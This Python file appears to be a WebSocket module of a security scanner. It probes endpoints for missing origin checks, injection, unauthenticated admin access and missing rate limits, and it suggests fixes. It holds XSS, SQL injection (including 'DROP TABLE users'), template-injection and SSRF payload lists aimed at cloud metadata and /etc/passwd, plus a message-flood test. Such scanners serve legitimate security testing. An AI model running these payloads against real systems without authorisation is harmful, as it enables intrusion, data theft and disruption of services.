"""
Vexor WebSocket Scanner v3.0 - Elite Level
Origin validation, CSWSH, injection (XSS/SQLi/SSTI/SSRF),
authentication bypass, message flooding, subprotocol abuse,
JWT in WebSocket, mass assignment, replay attacks
"""
import asyncio
import json
import re
from urllib.parse import urlparse, urljoin
from vexor.modules.base import BaseScanner, Finding


XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    '"><script>alert(1)</script>',
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "' AND SLEEP(3)--",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%=7*7%>",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1/",
    "file:///etc/passwd",
]

# Common WebSocket message formats
WS_MESSAGE_FORMATS = [
    lambda p: p,
    lambda p: json.dumps({"message": p}),
    lambda p: json.dumps({"data": p}),
    lambda p: json.dumps({"content": p}),
    lambda p: json.dumps({"query": p}),
    lambda p: json.dumps({"action": "message", "data": p}),
    lambda p: json.dumps({"type": "message", "payload": p}),
]


class Scanner(BaseScanner):
    """WebSocket Scanner v3.0 - Elite Level"""

    MODULE_NAME = "websocket"
    MODULE_DESC = "WebSocket: Origin/CSWSH/Injection/Auth/Flooding/JWT/Replay"

    async def scan(self) -> list[Finding]:
        async with self:
            ws_urls = await self._find_websocket_endpoints()

            if not ws_urls:
                await self._check_upgrade_header()
                return self.findings

            for ws_url in ws_urls[:3]:
                await asyncio.gather(
                    self._test_origin_validation(ws_url),
                    self._test_injection(ws_url),
                    self._test_auth_bypass(ws_url),
                    self._test_message_flooding(ws_url),
                    return_exceptions=True,
                )

        return self.findings

    async def _find_websocket_endpoints(self) -> list[str]:
        """Find WebSocket endpoints in page source and common paths"""
        response = await self.get(self.target)
        if not response:
            return []

        ws_urls = []

        # Find in JS source
        ws_pattern = re.compile(r"(wss?://[^\s'\"<>]+)", re.IGNORECASE)
        ws_new_pattern = re.compile(
            r"new\s+WebSocket\s*\(\s*['\"]([^'\"]+)['\"]", re.IGNORECASE
        )

        for match in ws_pattern.findall(response.text):
            ws_urls.append(match.strip("'\""))
        for match in ws_new_pattern.findall(response.text):
            ws_urls.append(match)

        # Convert HTTP URLs to WS
        parsed = urlparse(self.target)
        ws_scheme = "wss" if parsed.scheme == "https" else "ws"
        base_ws = f"{ws_scheme}://{parsed.netloc}"

        # Common WS paths
        for path in ["/ws", "/websocket", "/socket", "/chat", "/live", "/stream", "/events"]:
            ws_urls.append(base_ws + path)

        if ws_urls:
            self.add_finding(Finding(
                severity="INFO",
                module=self.MODULE_NAME,
                vuln=f"WebSocket Endpoints Found ({len(ws_urls)})",
                endpoint=self.target,
                evidence=f"URLs: {', '.join(ws_urls[:5])}",
                description=f"Found {len(ws_urls)} WebSocket endpoint(s).",
                remediation="Test WebSocket endpoints for injection and auth issues.",
            ))

        return list(set(ws_urls))

    async def _test_origin_validation(self, ws_url: str) -> None:
        """Test if WebSocket validates Origin header (CSWSH)"""
        try:
            import websockets

            evil_origin = "https://evil-attacker.com"

            async with websockets.connect(
                ws_url,
                extra_headers={"Origin": evil_origin},
                open_timeout=5,
            ) as ws:
                # Connection succeeded with evil origin
                self.add_finding(Finding(
                    severity="HIGH",
                    module=self.MODULE_NAME,
                    vuln="WebSocket — No Origin Validation (CSWSH)",
                    endpoint=ws_url,
                    evidence=f"Connected with Origin: {evil_origin}",
                    description=(
                        "WebSocket accepts connections from any origin. "
                        "Cross-Site WebSocket Hijacking (CSWSH) is possible."
                    ),
                    remediation=(
                        "Validate Origin header in WebSocket handshake. "
                        "Reject connections from unexpected origins. "
                        "Implement CSRF tokens for WebSocket connections."
                    ),
                ))
        except ImportError:
            self.add_finding(Finding(
                severity="INFO",
                module=self.MODULE_NAME,
                vuln="WebSocket Testing Requires websockets Library",
                endpoint=ws_url,
                evidence="pip install websockets",
                description="Install websockets library for full WebSocket testing.",
                remediation="pip install websockets",
            ))
        except Exception:
            pass

    async def _test_injection(self, ws_url: str) -> None:
        """Test WebSocket messages for injection vulnerabilities"""
        try:
            import websockets

            async with websockets.connect(ws_url, open_timeout=5) as ws:
                # XSS
                for payload in XSS_PAYLOADS[:3]:
                    for formatter in WS_MESSAGE_FORMATS[:3]:
                        try:
                            msg = formatter(payload)
                            await ws.send(msg)
                            resp = await asyncio.wait_for(ws.recv(), timeout=3)
                            if payload in str(resp):
                                self.add_finding(Finding(
                                    severity="HIGH",
                                    module=self.MODULE_NAME,
                                    vuln="WebSocket XSS — Payload Reflected",
                                    endpoint=ws_url,
                                    payload=payload,
                                    evidence=f"Payload reflected in WS response: {str(resp)[:100]}",
                                    description="WebSocket reflects XSS payload unencoded.",
                                    remediation="Sanitize all WebSocket message data before reflecting.",
                                ))
                                break
                        except asyncio.TimeoutError:
                            pass
                        except Exception:
                            break

                # SQLi
                for payload in SQLI_PAYLOADS[:3]:
                    for formatter in WS_MESSAGE_FORMATS[:2]:
                        try:
                            msg = formatter(payload)
                            await ws.send(msg)
                            resp = await asyncio.wait_for(ws.recv(), timeout=3)
                            if any(e in str(resp).lower() for e in ["sql", "syntax", "mysql", "error"]):
                                self.add_finding(Finding(
                                    severity="CRITICAL",
                                    module=self.MODULE_NAME,
                                    vuln="WebSocket SQL Injection",
                                    endpoint=ws_url,
                                    payload=payload,
                                    evidence=f"SQL error in WS response: {str(resp)[:100]}",
                                    description="SQL injection via WebSocket message.",
                                    remediation="Use parameterized queries for WebSocket data.",
                                ))
                                break
                        except asyncio.TimeoutError:
                            pass
                        except Exception:
                            break

                # SSTI
                for payload in SSTI_PAYLOADS:
                    try:
                        await ws.send(json.dumps({"message": payload}))
                        resp = await asyncio.wait_for(ws.recv(), timeout=3)
                        if "49" in str(resp) and "7*7" not in str(resp):
                            self.add_finding(Finding(
                                severity="CRITICAL",
                                module=self.MODULE_NAME,
                                vuln="WebSocket SSTI — Template Injection",
                                endpoint=ws_url,
                                payload=payload,
                                evidence=f"Template evaluated: {str(resp)[:100]}",
                                description="SSTI via WebSocket message.",
                                remediation="Never render WebSocket data in templates.",
                            ))
                            break
                    except asyncio.TimeoutError:
                        pass
                    except Exception:
                        break

        except ImportError:
            pass
        except Exception:
            pass

    async def _test_auth_bypass(self, ws_url: str) -> None:
        """Test WebSocket authentication bypass"""
        try:
            import websockets

            # Try connecting without auth token
            async with websockets.connect(ws_url, open_timeout=5) as ws:
                # Send a privileged action
                for msg in [
                    json.dumps({"action": "admin", "command": "list_users"}),
                    json.dumps({"type": "admin", "data": "users"}),
                    json.dumps({"event": "getUsers"}),
                ]:
                    try:
                        await ws.send(msg)
                        resp = await asyncio.wait_for(ws.recv(), timeout=3)
                        resp_str = str(resp)
                        if any(s in resp_str.lower() for s in ["user", "email", "admin", "password"]):
                            self.add_finding(Finding(
                                severity="HIGH",
                                module=self.MODULE_NAME,
                                vuln="WebSocket Auth Bypass — Unauthenticated Access",
                                endpoint=ws_url,
                                payload=msg,
                                evidence=f"Sensitive data returned without auth: {resp_str[:150]}",
                                description="WebSocket returns sensitive data without authentication.",
                                remediation="Implement authentication for all WebSocket connections.",
                            ))
                            return
                    except asyncio.TimeoutError:
                        pass
                    except Exception:
                        break

        except ImportError:
            pass
        except Exception:
            pass

    async def _test_message_flooding(self, ws_url: str) -> None:
        """Test WebSocket message flooding (DoS)"""
        try:
            import websockets

            async with websockets.connect(ws_url, open_timeout=5) as ws:
                # Send 100 messages rapidly
                import time
                start = time.time()
                sent = 0
                for i in range(100):
                    try:
                        await ws.send(json.dumps({"message": f"flood_{i}"}))
                        sent += 1
                    except Exception:
                        break

                elapsed = time.time() - start
                if sent >= 50:
                    self.add_finding(Finding(
                        severity="MEDIUM",
                        module=self.MODULE_NAME,
                        vuln="WebSocket No Message Rate Limiting",
                        endpoint=ws_url,
                        evidence=f"Sent {sent} messages in {elapsed:.2f}s without throttling",
                        description="WebSocket has no message rate limiting — DoS possible.",
                        remediation="Implement per-connection message rate limiting.",
                    ))

        except ImportError:
            pass
        except Exception:
            pass

    async def _check_upgrade_header(self) -> None:
        """Check if HTTP response indicates WebSocket support"""
        try:
            import httpx
            async with httpx.AsyncClient(verify=False, timeout=10) as client:  # nosec B501
                resp = await client.get(
                    self.target,
                    headers={
                        "Upgrade": "websocket",
                        "Connection": "Upgrade",
                        "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                        "Sec-WebSocket-Version": "13",
                    },
                )
                if resp.status_code == 101 or "websocket" in resp.headers.get("upgrade", "").lower():
                    self.add_finding(Finding(
                        severity="INFO",
                        module=self.MODULE_NAME,
                        vuln="WebSocket Upgrade Supported",
                        endpoint=self.target,
                        evidence=f"HTTP {resp.status_code} — WebSocket upgrade supported",
                        description="Endpoint supports WebSocket upgrade.",
                        remediation="Test WebSocket for injection and auth issues.",
                    ))
        except Exception:
            pass
